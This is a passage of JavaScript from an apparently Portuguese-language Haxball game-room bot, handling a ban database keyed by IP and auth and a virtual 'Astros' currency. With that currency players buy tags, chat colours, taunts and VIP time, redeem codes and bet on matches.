                setVipCommand(player, `!setvip ${player.id} ${msgArray[0]}`)
                const newDuration = Date.now() + vipGalacticoDuration;
                infovip[player.name] = {
                    'nome': player.name,
                    'tempo': newDuration,
                    'tipo': msgArray[0]
                }
                infovipstorage.splice(0, infovipstorage.length)
                infovipstorage.push(infovip)
                localStorage.setItem("infovip", JSON.stringify(infovipstorage));
                room.sendAnnouncement(`Você resgatou seu vip ${vipnames[parseInt(msgArray[0])]}, parabéns!!!!`, player.id, 0x08FFF7, "bold", 0);
                room.sendAnnouncement(`${player.name} ativou um período VIP ${vipnames[parseInt(msgArray[0])]}!!!`, null, 0x08FFF7, "bold", 0);
                transacoesPlayers(urls.transacoes, {
                    content: "```" + roomName + "\n" + "💎Data dessa transação: " + `${dataehora()}` + "\n" +
                        `💎${player.name} comprou um mês de Vip ${vipnames[parseInt(msgArray[0])]}` + "```"
                })
            }

        }
        else {
            room.sendAnnouncement(
                `Digite um número válido, digite !comprarvip <numero do vip>`,
                player.id,
                errorColor,
                'bold',
                HaxNotification.CHAT
            );
            room.sendAnnouncement(
                `1 - ${vipNames[1]}, 2- ${vipNames[2]}, 3 - ${vipNames[3]}, 4 - ${vipNames[4]}`,
                player.id,
                errorColor,
                'bold',
                HaxNotification.CHAT
            );
        }
    }
    else {
        room.sendAnnouncement(
            `Você digitou o comando errado, digite !comprarvip <numero do vip>`,
            player.id,
            errorColor,
            'bold',
            HaxNotification.CHAT
        );
    }

} */

function getBanimentoById(id) {
    return new Promise((resolve, reject) => {
        const request = openBanimentosDatabase();

        request.onsuccess = function (event) {
            const db = event.target.result;
            const transaction = db.transaction(["banimentos"], "readonly");
            const banimentosStore = transaction.objectStore("banimentos");

            const getRequest = banimentosStore.get(id);

            getRequest.onsuccess = function (event) {
                const banimento = event.target.result;
                if (banimento) {
                    resolve(banimento);
                } else {
                    reject(`Banimento com ID ${id} não encontrado.`);
                }
            };

            getRequest.onerror = function (event) {
                reject(`Erro ao obter o banimento com ID ${id}`);
            };
        };
    });
}

function openBanimentosDatabase() {
    const request = indexedDB.open("banimentos", 1);

    request.onupgradeneeded = function (event) {
        const db = event.target.result;

        const banimentosStore = db.createObjectStore("banimentos", { keyPath: "id", autoIncrement: true });

        banimentosStore.createIndex("nome", "nome", { unique: false });
        banimentosStore.createIndex("auth", "auth", { unique: false });
        banimentosStore.createIndex("conn", "conn", { unique: false });
        banimentosStore.createIndex("ipv4", "ipv4", { unique: false });
        banimentosStore.createIndex("motivo", "motivo", { unique: false });
        banimentosStore.createIndex("admin", "admin", { unique: false });
        banimentosStore.createIndex("tempoInicial", "tempoInicial", { unique: false });
        banimentosStore.createIndex("tempoFinal", "tempoFinal", { unique: false });
    };

    return request;
}

function addBanimento(banimento) {
    return new Promise((resolve, reject) => {
        const request = openBanimentosDatabase();

        request.onsuccess = function (event) {
            const db = event.target.result;
            const transaction = db.transaction(["banimentos"], "readwrite");
            const banimentosStore = transaction.objectStore("banimentos");

            const addRequest = banimentosStore.add(banimento);

            addRequest.onsuccess = function () {
                resolve("Banimento adicionado com sucesso!");
            };

            addRequest.onerror = function () {
                reject("Erro ao adicionar o banimento");
            };
        };
    });
}

function getBanInfo(mode, value) {
    return new Promise((resolve, reject) => {
        const request = openBanimentosDatabase();

        request.onsuccess = function (event) {
            const db = event.target.result;
            const transaction = db.transaction(["banimentos"], "readonly");
            const banimentosStore = transaction.objectStore("banimentos");

            const index = banimentosStore.index(mode);
            const cursorRequest = index.openCursor(IDBKeyRange.only(value));

            const banInfo = [];

            cursorRequest.onsuccess = function (event) {
                const cursor = event.target.result;

                if (cursor) {
                    banInfo.push(cursor.value);
                    cursor.continue();
                } else {
                    resolve(banInfo.map(formatBanInfo).join("\n"));
                }
            };

            cursorRequest.onerror = function (event) {
                reject("Erro ao obter informações do banimento");
            };
        };
    });
}

function formatBanInfo(ban) {
    return `- ID: ${ban.id}\n- Nome: ${ban.nome}\n- Auth: ${ban.auth}\n- Conn: ${ban.conn}\n- IPv4: ${ban.ipv4}\n- Motivo: ${ban.motivo}\n- Admin: ${ban.admin}\n- Tempo Inicial: ${ban.tempoInicial}\n- Tempo Final: ${ban.tempoFinal}`;
}

function calcularTempoFinal(tempo) {
    const regex = /^(\d+)([mdhM])$/;
    const match = tempo.match(regex);

    if (!match) {
        throw new Error("Formato de tempo inválido. Use um número seguido de 'd' para dias, 'm' para meses, 'h' para horas, ou 'M' para minutos (ex: 1d, 2m, 3h, 4M).");
    }

    const quantidade = parseInt(match[1]);
    const unidade = match[2].toLowerCase();

    const agora = new Date();
    const tempoFinal = new Date(agora);

    if (unidade === 'd') {
        tempoFinal.setDate(agora.getDate() + quantidade);
    } else if (unidade === 'm') {
        tempoFinal.setMinutes(agora.getMinutes() + quantidade);
    } else if (unidade === 'h') {
        tempoFinal.setHours(agora.getHours() + quantidade);
    } else if (unidade === 'M') {
        tempoFinal.setMonth(agora.getMinutes() + quantidade);
    }

    return tempoFinal;
}

function formatarMensagem(data) {
    const options = { year: 'numeric', month: 'long', day: 'numeric' };
    const dataFormatada = data.toLocaleDateString('pt-BR', options);
    return `Até ${dataFormatada}`;
}

function removeBanimentosExpirados() {
    const request = openBanimentosDatabase();

    request.onsuccess = function (event) {
        const db = event.target.result;
        const transaction = db.transaction(["banimentos"], "readwrite");
        const banimentosStore = transaction.objectStore("banimentos");

        const cursorRequest = banimentosStore.openCursor();

        cursorRequest.onsuccess = function (event) {
            const cursor = event.target.result;

            if (cursor) {
                const banimento = cursor.value;

                const agora = new Date();
                if (banimento.tempoFinal <= agora) {
                    banimentosStore.delete(cursor.primaryKey);
                }

                cursor.continue();
            }
        };
    };

    request.onerror = function (event) {
        console.error(event.target.error);
    };
}

function buscarJogadorPorIdOne(playerId) {
    for (const playerName in account) {
        if (account.hasOwnProperty(playerName) && account[playerName].id == playerId) {
            return account[playerName];
        }
    }
    return null;
}

function buscarJogadorPorIdTwo(playerId) {
    for (const playerName in account2) {
        if (account2.hasOwnProperty(playerName) && account2[playerName].id == playerId) {
            return account2[playerName];
        }
    }
    return null;
}

function buscarBanimentoPorIpv4(ipv4) {
    return new Promise((resolve, reject) => {
        const request = openBanimentosDatabase();

        request.onsuccess = function (event) {
            const db = event.target.result;
            const transaction = db.transaction(["banimentos"], "readonly");
            const banimentosStore = transaction.objectStore("banimentos");
            const index = banimentosStore.index("ipv4");

            const getRequest = index.getAll(ipv4);

            getRequest.onsuccess = function (event) {
                const banimentos = event.target.result;

                if (banimentos && banimentos.length > 0) {
                    console.log("Banimentos encontrados por IPv4:", banimentos);
                    resolve(banimentos);
                } else {
                    if (testMode) {
                        console.log("Nenhum banimento encontrado para o IPv4:", ipv4);
                    }
                    resolve([]);
                }
            };

            getRequest.onerror = function (event) {
                console.error("Erro ao buscar banimentos por IPv4:", event.target.error);
                reject(event.target.error);
            };
        };

        request.onerror = function (event) {
            console.error(event.target.error);
            reject(event.target.error);
        };
    });
}

function buscarBanimentoPorAuth(auth) {
    return new Promise((resolve, reject) => {
        const request = openBanimentosDatabase();

        request.onsuccess = function (event) {
            const db = event.target.result;
            const transaction = db.transaction(["banimentos"], "readonly");
            const banimentosStore = transaction.objectStore("banimentos");
            const index = banimentosStore.index("auth");

            const getRequest = index.getAll(auth);

            getRequest.onsuccess = function (event) {
                const banimentos = event.target.result;

                if (banimentos && banimentos.length > 0) {
                    console.log("Banimentos encontrados por Auth:", banimentos);
                    resolve(banimentos);
                } else {
                    if (testMode) {
                        console.log("Nenhum banimento encontrado para o Auth:", auth);
                    }
                    resolve([]);
                }
            };

            getRequest.onerror = function (event) {
                console.error("Erro ao buscar banimentos por Auth:", event.target.error);
                reject(event.target.error);
            };
        };

        request.onerror = function (event) {
            console.error(event.target.error);
            reject(event.target.error);
        };
    });
}

function buscarBanimentoPorConn(conn) {
    return new Promise((resolve, reject) => {
        const request = openBanimentosDatabase();

        request.onsuccess = function (event) {
            const db = event.target.result;
            const transaction = db.transaction(["banimentos"], "readonly");
            const banimentosStore = transaction.objectStore("banimentos");
            const index = banimentosStore.index("conn");

            const getRequest = index.getAll(conn);

            getRequest.onsuccess = function (event) {
                const banimentos = event.target.result;

                if (banimentos && banimentos.length > 0) {
                    console.log("Banimentos encontrados por Conn:", banimentos);
                    resolve(banimentos);
                } else {
                    if (testMode) {
                        console.log("Nenhum banimento encontrado para a Conn:", conn);
                    }
                    resolve([]);
                }
            };

            getRequest.onerror = function (event) {
                console.error("Erro ao buscar banimentos por Conn:", event.target.error);
                reject(event.target.error);
            };
        };

        request.onerror = function (event) {
            console.error(event.target.error);
            reject(event.target.error);
        };
    });
}

function buscarBanimentoPorNomeOuId(nomeOuId) {
    return new Promise((resolve, reject) => {
        const request = openBanimentosDatabase();

        request.onsuccess = function (event) {
            const db = event.target.result;
            const transaction = db.transaction(["banimentos"], "readonly");
            const banimentosStore = transaction.objectStore("banimentos");

            const getRequest = banimentosStore.get(nomeOuId);

            getRequest.onsuccess = function (event) {
                const banimento = event.target.result;

                if (banimento) {
                    console.log("Banimento encontrado por Nome/ID:", banimento);
                    resolve([banimento]);
                } else {
                    if (testMode) {
                        console.log("Nenhum banimento encontrado para o Nome/ID:", nomeOuId);
                    }
                    resolve([]);
                }
            };

            getRequest.onerror = function (event) {
                console.error("Erro ao buscar banimento por Nome/ID:", event.target.error);
                reject(event.target.error);
            };
        };

        request.onerror = function (event) {
            console.error(event.target.error);
            reject(event.target.error);
        };
    });
}

function codigo(player, message) {
    const msg = message.split(/ +/);
    if (msg.length == 3) {
        codigo = msg[1]
        const found = codigos.find(element => element[0] == codigo)
        if (found) {
            room.sendAnnouncement("Este código já existe.", player.id, errorColor, "bold", 0);
            return;
        }
        quantidade = msg[2]
        codigos.push([codigo, quantidade])
        localStorage.setItem('codigos', JSON.stringify(codigos))
        room.sendAnnouncement(`Código de ${quantidade} Astros cadrastado!`, player.id, 0x76FF03, "bold", 0);
        att = ["y"]
        localStorage.setItem("att", JSON.stringify(att));
    }
    else {
        room.sendAnnouncement("Algo errado !codigos codigo quantidade", player.id, errorColor, "bold", 0);
    }

}

function comprarprovo(player, message) {
    const provo2 = parseInt(message.substr(14));
    console.log(provo2);
    const playerAstros = astros[player.name]; // Obtém o saldo de Astros do jogador
    if (playerAstros != null) {
        const custoProvo = 1; // Defina o custo da provocação
        if (playerAstros >= custoProvo) {
            console.log(`Player: ${player}`);
            console.log(`Provo: ${provo2}`);

            const provoComprado = provosBuy[provo2]; // Obtém a provocação correspondente ao número fornecido
            if (!provoComprado) {
                room.sendAnnouncement("Provocação não encontrada.", player.id, cores.vermelho, "bold", 0);
                return;
            }

            console.log(provoComprado);

            const found = minhasprovos.find(element => element[0] == player.name); // Procura se há algum jogador no banco de dados com o nome do player
            if (found) {
                // Verifica se o jogador já possui a provocação
                const jaPossui = found.slice(1).some(provocacao => provocacao[0] === provo2);
                if (jaPossui) {
                    room.sendAnnouncement("Você já possui essa provocação.", player.id, cores.vermelho, "bold", 0);
                    return;
                }
                console.log(found);
                found.push([provo2, provoComprado]); // Adiciona o número da provocação junto com a provocação
                minhasprovos.splice(minhasprovos.indexOf(found), 1);
                minhasprovos.push(found);
                localStorage.setItem("minhasprovos", JSON.stringify(minhasprovos));
                console.log(minhasprovos);
            } else {
                minhasprovos.push([player.name, [provo2, provoComprado]]);
                localStorage.setItem("minhasprovos", JSON.stringify(minhasprovos));
            }

            room.sendAnnouncement(`Você comprou a provocação ${provo2}: ${provoComprado}, qualquer erro, fale com os adms`, player.id, cores.vermelho, "bold", 0);
            transacoesPlayers(urls.transacoes, {
                content: "```" + roomName + "\n" + "🌈 Data dessa transação: " + `${dataehora()}` + "\n" +
                    `🔥 ${player.name} comprou a provocação ${provo2}: ${provoComprado}` + "```"
            });
            subAstros(player, custoProvo);
            room.sendAnnouncement(`Seu saldo atual é: ${playerAstros - custoProvo} Astros`, player.id, cores.branco, "bold", 0);
            att = ["y"];
            localStorage.setItem("att", JSON.stringify(att));
        } else {
            room.sendAnnouncement("Você não tem Astros suficientes. !astros", player.id, cores.vermelho, "bold", 0);
        }
    } else {
        room.sendAnnouncement("ERRO, CONTATE UM ADMIN.", player.id, cores.vermelho, "bold", 0);
    }
}


function comprartag(player, message) {
    const tag = message.substr(12) // sem o '!comprartag 
    var pago = verificarPreco(player, produtos.tag)
    if (!pago) {
        return;
    }
    if (minhastags[authArray[player.id]]) {// se achar o player, apaga a tag anterior e põe a nova'
        minhastags[authArray[player.id]].push(tag)
        minhastagsstorage.splice(0, minhastagsstorage.length)
        minhastagsstorage.push(minhastags)
        localStorage.setItem("minhastags", JSON.stringify(minhastagsstorage));
        att = ["y"]
        localStorage.setItem("att", JSON.stringify(att));
    }


    else {// se não encontrar nada, cria os dados no localstorage
        minhastags[authArray[player.id]] = [tag]
        minhastagsstorage.splice(0, minhastagsstorage.length)
        minhastagsstorage.push(minhastags)
        localStorage.setItem("minhastags", JSON.stringify(minhastagsstorage));
    }
    room.sendAnnouncement(`Você comprou a tag ${tag}, !minhastags para ver`, player.id, 0x08FFF7, "bold", 0);
    transacoesPlayers(urls.transacoes, {
        content: "```" + roomName + "\n" + "🎫Data dessa transação: " + `${dataehora()}` + "\n" +
            `🎫${player.name} comprou a tag ${tag}` + "```"
    })
}


function minhasTags(player, message) {
    var msgArray = message.split(/ +/).slice(1);
    if (msgArray.length == 0) {
        if (minhastags[authArray[player.id]]) {
            const novaArray = minhastags[authArray[player.id]];
            const string = novaArray.join(", ");
            room.sendAnnouncement(`Suas tags: ${string}`, player.id, 0x08FFF7, "bold", 0);
        }
        else {
            room.sendAnnouncement(`Você não tem tag`, player.id, 0x08FFF7, "bold", 0);
        }
    }
    else if (msgArray.length == 1) {
        if (minhastags[authArray[player.id]]) {
            if (msgArray[0] <= (minhastags[authArray[player.id]].length) && msgArray[0] > 0) {

                if (tags[player.name]) {// se achar o player, apaga a tag anterior e põe a nova
                    tags[player.name] = minhastags[authArray[player.id]][msgArray[0] - 1]
                    tagsstorage.splice(0, tagsstorage.length)
                    tagsstorage.push(tags)
                    localStorage.setItem("tags", JSON.stringify(tagsstorage));
                }


                else {// se não encontrar nada, cria os dados no localstorage
                    tags[player.name] = minhastags[authArray[player.id]][msgArray[0] - 1]
                    tagsstorage.splice(0, tagsstorage.length)
                    tagsstorage.push(tags)
                    localStorage.setItem("tags", JSON.stringify(tagsstorage));
                }
                room.sendAnnouncement(`Você colocou a tag ${minhastags[authArray[player.id]][msgArray[0] - 1]}`, player.id, 0x08FFF7, "bold", 0);

            }
            else {
                room.sendAnnouncement(`Você digitou algo errado`, player.id, errorColor, "bold", 0);
            }
        } else {
            room.sendAnnouncement(`Você não tem tag`, player.id, errorColor, "bold", 0);
        }
    }
    else {
        room.sendAnnouncement(`Você está digitando mais dados que o necessário.`, player.id, errorColor, "bold", 0);
    }
}



function comprarCor(player, message) {
    var cor = message.split(/ +/).slice(1);
    let regEx0 = new RegExp(`^[0-9a-fA-F]{6}$`)
    if (!regEx0.test(cor[0])) {
        room.sendAnnouncement(`Código/Formato de cor inválido! Formato correto: FFFFFF`,
            player.id, 0xffffff, 'bold', HaxNotification.CHAT);
        return false;
    }

    var pago = verificarPreco(player, produtos.cor)
    if (!pago) {
        return;
    }

    if (cordochat[authArray[player.id]]) {
        cordochat[player.name] = cor
    } else {
        cordochat[player.name] = [cor];
    }

    cordochatstorage.splice(0, cordochatstorage.length);
    cordochatstorage.push(cordochat);
    localStorage.setItem("cordochat", JSON.stringify(cordochatstorage));
    att = ["y"];
    localStorage.setItem("att", JSON.stringify(att));

    room.sendAnnouncement(`Você comprou a cor do chat: ${cor}, qualquer erro, fale com os adms`, player.id, errorColor, "bold", 0);
    transacoesPlayers(urls.transacoes, {
        content: "```" + roomName + "\n" + "🌈Data dessa transação: " + `${dataehora()}` + "\n" +
            `🌈${player.name} comprou a cor ${cor}` + "```"
    });
}


function minhasCores(player, message) {
    var msgArray = message.split(/ +/).slice(1);
    if (msgArray.length == 0) {
        if (minhascores[authArray[player.id]]) {
            const novaArray = minhascores[authArray[player.id]];
            const string = novaArray.join(", ");
            room.sendAnnouncement(`Suas cores: ${string}`, player.id, 0x08FFF7, "bold", 0);
        }
        else {
            room.sendAnnouncement(`Você não tem cor`, player.id, 0x08FFF7, "bold", 0);
        }
    }
    else if (msgArray.length == 1) {
        if (minhascores[authArray[player.id]]) {
            if (msgArray[0] <= (minhascores[authArray[player.id]].length) && msgArray[0] > 0) {

                if (cordochat[player.name]) {// se achar o player, apaga a tag anterior e põe a nova
                    cordochat[player.name] = minhascores[authArray[player.id]][msgArray[0] - 1]
                    cordochatstorage.splice(0, cordochatstorage.length)
                    cordochatstorage.push(cordochat)
                    localStorage.setItem("cordochat", JSON.stringify(cordochatstorage));
                }


                else {// se não encontrar nada, cria os dados no localstorage
                    cordochat[player.name] = minhascores[authArray[player.id]][msgArray[0] - 1]
                    cordochatstorage.splice(0, cordochatstorage.length)
                    cordochatstorage.push(cordochat)
                    localStorage.setItem("cordochat", JSON.stringify(cordochatstorage));
                }
                room.sendAnnouncement(`Você colocou a cor ${minhascores[authArray[player.id]][msgArray[0] - 1]}`, player.id, 0x08FFF7, "bold", 0);

            }
            else {
                room.sendAnnouncement(`Você digitou algo errado`, player.id, errorColor, "bold", 0);
            }
        } else {
            room.sendAnnouncement(`Você não tem cor`, player.id, errorColor, "bold", 0);
        }
    }
    else {
        room.sendAnnouncement(`Você está digitando mais dados que o necessário.`, player.id, errorColor, "bold", 0);
    }
}


function tirarCor(player) {
    if (cordochat[player.name]) {
        delete cordochat[player.name]
        cordochatstorage.splice(0, cordochatstorage.length)
        cordochatstorage.push(cordochat)
        vips[authArray[player.id]].corChat = ''
        vipsdb.splice(0, vipsdb.length)
        vipsdb.push(vips)
        localStorage.setItem("vips", JSON.stringify(vipsdb));
        localStorage.setItem("cordochat", JSON.stringify(cordochatstorage));
        room.sendAnnouncement(`Você retirou sua Cor do chat!`, player.id, 0x76FF03, "bold", 0);
    }
    else if (vips[authArray[player.id]].corChat != '') {
        vips[authArray[player.id]].corChat = ''
        vipsdb.splice(0, vipsdb.length)
        vipsdb.push(vips)
        localStorage.setItem("vips", JSON.stringify(vipsdb));
        room.sendAnnouncement(`Você retirou sua Cor do chat!`, player.id, 0x76FF03, "bold", 0);
    }

    else {
        room.sendAnnouncement(`Você não tem cor de chat`, player.id, errorColor, "bold", 0);
    }
}

function infoVip(player) {
    if (vips[authArray[player.id]]) {
        if (infovip[player.name]) {
            let dataInicial = new Date().getTime()
            let diferencaEmMs = infovip[player.name]['tempo'] - dataInicial;
            let diferencaEmDias = Math.floor(diferencaEmMs / (1000 * 60 * 60 * 24));
            let restoEmMs = diferencaEmMs % (1000 * 60 * 60 * 24);
            let diferencaEmHoras = Math.floor(restoEmMs / (1000 * 60 * 60));
            room.sendAnnouncement(`∎∎∎∎ VIP ${vipnames[tipoVip]} ∎∎∎∎`, player.id, 0x76FF03, "bold", 0);
            room.sendAnnouncement(`Faltam ${diferencaEmDias} Dias e ${diferencaEmHoras} Horas para seu VIP acabar.`, player.id, 0x76FF03, "bold", 0);
        }
        else { room.sendAnnouncement(`∎∎∎∎ Você possui VIP ${vipnames[tipoVip]} pelo tempo determinado de pagamento ∎∎∎∎`, player.id, 0x2BEAFF, "bold", 0); }
    }
    else {
        room.sendAnnouncement("Você não é VIP!", player.id, errorColor, "bold", 0);
    }
}


function buscarIds(player, message) {
    const msg = message.substr(4) // sem o !ids
    if (msg.length != 0) {
        const nick = msg.substr(1)
        if (dadosjogadores[nick]) {
            room.sendAnnouncement(`Nick: ${nick} ID do jogador ${dadosjogadores[nick]['id']}`, player.id, 0x76FF03, "bold", 0);

        }
        else {
            room.sendAnnouncement("Não há jogadores com esse nick. Verifique a ortografia", player.id, errorColor, "bold", 0);
        }

    }
    else {
        let ids = room.getPlayerList();
        ids.forEach(function (id) {
            room.sendAnnouncement(`${id['name']}: ${id['id']}`, player.id, 0x76FF03, 'bold', 1);
        });
    }
}

function verificarPreco(player, valoritem) {
    const saldo = astros[player.name] != null ? astros[player.name] : 0
    if (saldo >= valoritem) {
        subAstros(player, valoritem)
        return true
    }
    else {
        room.sendAnnouncement(
            `Você não tem astros suficientes`,
            player.id,
            errorColor,
            'bold',
            HaxNotification.CHAT
        )
        room.sendAnnouncement(
            `Seu saldo é de ${saldo} Astros e o produto custa ${valoritem}`,
            player.id,
            errorColor,
            'bold',
            HaxNotification.CHAT
        )
        return false
    }
}

function showAstros(player) {
    try {
        room.sendAnnouncement(`Seu saldo atual é: ${astros[player.name]} Astros`, player.id, 0x76FF03, "bold", 0)
    }
    catch {
        room.sendAnnouncement(`CONTATE UM ADMINISTRADOR, ERROR ASTROS#596`, player.id, errorColor, "bold", 0)

    }
}

function testeAstros1(player) {
    var quantidade = 1000;
    if (astros[player.name] != null) {
        astros[player.name] = parseInt(astros[player.name]) + parseInt(quantidade);
        astrosstorage.splice(0, astrosstorage.length);
        astrosstorage.push(astros);
        localStorage.setItem("astros", JSON.stringify(astrosstorage));
    }
}

function testeAstros2(player) {
    var quantidade = 50;
    if (astros[player.name] != null) {
        astros[player.name] = parseInt(astros[player.name]) - parseInt(quantidade);
        astrosstorage.splice(0, astrosstorage.length);
        astrosstorage.push(astros);
        localStorage.setItem("astros", JSON.stringify(astrosstorage));
        room.sendAnnouncement(`- ${quantidade} Astros`, player.id, errorColor, "bold", 0);
    }
}


function subAstros(player, quantidade) {
    if (astros[player.name] != null) {
        astros[player.name] = parseInt(astros[player.name]) - parseInt(quantidade);
        astrosstorage.splice(0, astrosstorage.length);
        astrosstorage.push(astros);
        localStorage.setItem("astros", JSON.stringify(astrosstorage));
        room.sendAnnouncement(`- ${quantidade} Astros`, player.id, errorColor, "bold", 0);
    }
}

function addAstros(player, quantidade) {
    if (astros[player.name] != null) {
        astros[player.name] = parseInt(astros[player.name]) + parseInt(quantidade);
        astrosstorage.splice(0, astrosstorage.length);
        astrosstorage.push(astros);
        localStorage.setItem("astros", JSON.stringify(astrosstorage));
    }
}


function receber(player, message) {
    const msg = message.split(/ +/)
    if (msg.length == 2) {
        var codigo = msg[1]
        const found = codigos.find(element => element[0] == codigo)
        if (found) {
            codigos.splice(found, 1)
            localStorage.setItem('codigos', JSON.stringify(codigos))
            addAstros(player, found[1])
            room.sendAnnouncement(`Você resgatou ${found[1]} Astros, !astros para ver.`, player.id, 0x76FF03, "bold", 0);
            transacoesPlayers(urls.transacoes, {
                content: "```" + roomName + "\n" + "💲Data dessa transação: " + `${dataehora()}` + "\n" +
                    `💲${player.name} resgatou ${found[1]} Astros pelo código "${codigo}"` + "```"
            });
            att = ["y"]
            localStorage.setItem("att", JSON.stringify(att));
        }
        else {
            room.sendAnnouncement("Código não cadastrado.", player.id, errorColor, "bold", 0);
        }
    }
    else {
        room.sendAnnouncement("Algo errado !codigoastros quantidade", player.id, errorColor, "bold", 0);
    }
}


function mudarTag(player, message) {
    const tag = message.substr(5); // sem o '!tag '

    if (minhastags[authArray[player.id]]) {
        // Verifica se a tag que o jogador quer adicionar já está presente (ignorando maiúsculas/minúsculas)
        if (minhastags[authArray[player.id]].map(t => t).includes(tag)) {
            tags[player.name] = tag
            room.sendAnnouncement(`[PV] Tag "${tag}" adicionada com sucesso!`, player.id, errorColor, 'bold', 0);
            return;
        }
    } else if (tipoVip == 4) {
        tags[player.name] = tag
        tagsstorage.splice(0, tagsstorage.length)
        tagsstorage.push(tags)
        localStorage.setItem("tags", JSON.stringify(tagsstorage));

        room.sendAnnouncement(`Você colocou a tag ${tag}`, player.id, 0x76FF03, "bold", 0);
        att = ["y"]
        localStorage.setItem("att", JSON.stringify(att));
    } else {
        room.sendAnnouncement(`Somente ${vipNames[4]} podem mudar usar este comando.`,
            player.id, errorColor, 'bold', HaxNotification.CHAT)

    }
}

function mudarCor(player, message) {
    const cor = message.substr(8); // sem o '!setcor '

    if (minhascores[authArray[player.id]]) {
        console.log('A');
        const coresDoJogador = minhascores[authArray[player.id]][0]; // Acessando diretamente o array de cores
        if (coresDoJogador.includes(cor)) {
            console.log('B');
            cordochat[player.name] = cor;
            room.sendAnnouncement(`[PV] Cor "${cor}" adicionada com sucesso!`, player.id, errorColor, 'bold', 0);
            return;
        }
    } else if (tipoVip == 4) {
        cordochat[player.name] = cor;

        cordochatstorage.splice(0, cordochatstorage.length);
        cordochatstorage.push(cordochat);
        localStorage.setItem("cordochat", JSON.stringify(cordochatstorage));
        att = ["y"];
        localStorage.setItem("att", JSON.stringify(att));

        room.sendAnnouncement(`Você colocou a cor ${cor}`, player.id, 0x76FF03, "bold", 0);
    } else {
        room.sendAnnouncement(`Somente ${vipNames[4]} podem usar este comando.`,
            player.id, errorColor, 'bold', HaxNotification.CHAT)
    }
}



function doarAstros(player, message) {

    var id = message[1]
    var valor = message[2]
    const playerList = room.getPlayerList();
    const found = playerList.find(element => element['id'] == id);
    if (found) {
        if (idp == player.id) {
            room.sendAnnouncement("Você não pode enviar astros para si mesmo", player.id, cores.vermelho, "bold", 0);
        }
        else {
            const findastros = astros.find(element => element[0] == player.name)
            if (findastros) {
                if (findastros[1] >= valor) {
                    subAstros(player, valor)
                    room.sendAnnouncement(`Você mandou ${valor} para ${found.name}`, player.id, cores.branco, "bold", 0)
                    addAstros(found, valor)
                    room.sendAnnouncement(`Você recebeu ${valor} Astros de ${player.name}`, found.id, cores.verde, "bold", 0)
                    att = ["y"]
                    localStorage.setItem("att", JSON.stringify(att));
                }
                else {
                    room.sendAnnouncement("Você não tem Astros suficientes. !astros", player.id, cores.vermelho, "bold", 0);
                }
            }
            else {
                room.sendAnnouncement("ERRO, CONTATE UM ADMIN.", player.id, cores.vermelho, "bold", 0);
            }

        }

    } else {
        room.sendAnnouncement("ID não encontrado.", player.id, cores.vermelho, "bold", 0);
    }
}

function apostar(player, message) {
    if (!testMode) {
        if (teamRed.length < teamSize || teamBlue.length < teamSize) {
            room.sendAnnouncement("Não há jogadores suficientes.", player.id, errorColor, "bold", 0);
            return;
        }
    }
    if (apostas == false) {
        room.sendAnnouncement("As apostas são feitas do intervalo até 15 segundos iniciais de cada partida.", player.id, errorColor, "bold", 0);
        return;
    }
    if (apostared[player.name] || apostablue[player.name]) {
        room.sendAnnouncement("Você ja apostou nessa rodada", player.id, errorColor, "bold", 0);
        return;
    }
    const aposta = message.split(/ +/).slice(1);
    console.log(aposta)
    console.log(aposta.length)
    if (aposta.length == 0) {
        room.sendAnnouncement(`💰💰💰 Apostas ${serverName} 💰💰💰`, player.id, announcementColor, "bold", 0);
        room.sendAnnouncement("use !apostar time valor", player.id, announcementColor, "bold", 0);
        room.sendAnnouncement("ex: !apostar red/blue valor", player.id, announcementColor, "bold", 0);
        room.sendAnnouncement(`OD time RED: ${odred}`, player.id, blueColor, "bold", 0);
        room.sendAnnouncement(`OD time BLUE: ${odblue}`, player.id, redColor, "bold", 0);
    }
    else if (aposta.length != 2) {
        room.sendAnnouncement("Você digitou o comando errado, ex: !apostar red valor", player.id, errorColor, "bold", 0);
        return;
    }
    else {
        if (player.team == 0) {
            if (mods.includes(authArray[player.id]) || adminList.includes(authArray[player.id]) || gerentes.includes(authArray[player.id]) || diretores.includes(authArray[player.id]) || donoList.includes(authArray[player.id]) || masterList.includes(authArray[player.id])) {
                const time = aposta[0]
                const valor = aposta[1]
                if (time != 'red' && time != 'blue' && time != 'RED' && time != 'BLUE') {
                    room.sendAnnouncement("use red para time vermelho e blue para time azul", player.id, errorColor, "bold", 0);
                    return;
                }
                if (!parseInt(valor)) {
                    room.sendAnnouncement("digite um valor válido", player.id, errorColor, "bold", 0);
                    return;
                }
                if (parseInt(valor) > 0 && parseInt(valor) <= 1000) {
                    pago = verificarPreco(player, parseInt(valor))
                    if (pago) {
                        if (time == 'RED' || time == 'red') {
                            apostared[player.name] = {
                                'od': odred,
                                'valor': valor
                            }
                        }
                        if (time == 'BLUE' || time == 'blue') {
                            apostablue[player.name] = {
                                'od': odblue,
                                'valor': valor
                            }
                        }
                        room.sendAnnouncement(`💰 ${player.name} apostou ${valor} Astros no time ${time}.`, null, announcementColor, "bold", 0);

                    }
                    else {
                        return;
                    }
                } else {
                    room.sendAnnouncement(`❌ ${player.name} O mínimo para apostar é 1 Astro, e o limite máximo dos Administradores é 8000 Astros.`, null, errorColor, "bold", 0);
                    return false;
                }
            } else {
                const time = aposta[0]
                const valor = aposta[1]
                if (time != 'red' && time != 'blue' && time != 'RED' && time != 'BLUE') {
                    room.sendAnnouncement("use red para time vermelho e blue para time azul", player.id, errorColor, "bold", 0);
                    return;
                }
                if (!parseInt(valor)) {
                    room.sendAnnouncement("digite um valor válido", player.id, errorColor, "bold", 0);
                    return;
                }
                if (parseInt(valor) > 0 && parseInt(valor) <= 1000) {
                    pago = verificarPreco(player, parseInt(valor))
                    if (pago) {
                        if (time == 'RED' || time == 'red') {
                            apostared[player.name] = {
                                'od': odred,
                                'valor': valor
                            }
                        }
                        if (time == 'BLUE' || time == 'blue') {
                            apostablue[player.name] = {
                                'od': odblue,
                                'valor': valor
                            }
                        }
                        room.sendAnnouncement(`💰 ${player.name} apostou ${valor} Astros no time ${time}.`, null, announcementColor, "bold", 0);

                    }
                    else {
                        return;
                    }
                } else {
                    room.sendAnnouncement(`❌ ${player.name} O mínimo para apostar é 1 Astro, e o limite máximo é 1000 Astros.`, null, errorColor, "bold", 0);
                    return false;
                }
            }
        } else {
            room.sendAnnouncement(`Você não pode apostar durante uma partida.`, player.id, errorColor, "bold", 2);
            return false;
        }

    }

}

function pagamentoAposta(winner) {
    if (winner == Team.RED) {
        for (let key in apostared) {
            const premio = parseInt(apostared[key]['valor'] * apostared[key]['od'])
            var playersonline = room.getPlayerList()
            var jogador = playersonline.filter((p) => p.name == (key))
